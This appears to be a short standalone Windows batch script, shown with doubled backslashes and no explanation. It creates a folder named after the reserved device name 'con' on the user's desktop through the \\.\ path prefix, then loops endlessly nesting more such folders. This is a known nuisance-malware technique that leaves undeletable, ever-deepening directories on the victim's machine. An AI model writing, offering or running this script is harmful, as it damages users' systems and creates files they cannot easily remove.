md\\.\\%userprofile%\\desktop\\con\\
set "dirri=%userprofile%\\desktop\\con\\"
:loop
md\\.\\%dirri%\\con\\
set "dirri2=%dirri%\\con\\"
md\\.\\%dirri2%\\con\\
set "dirri=%dirri2%\\con\\"
goto loop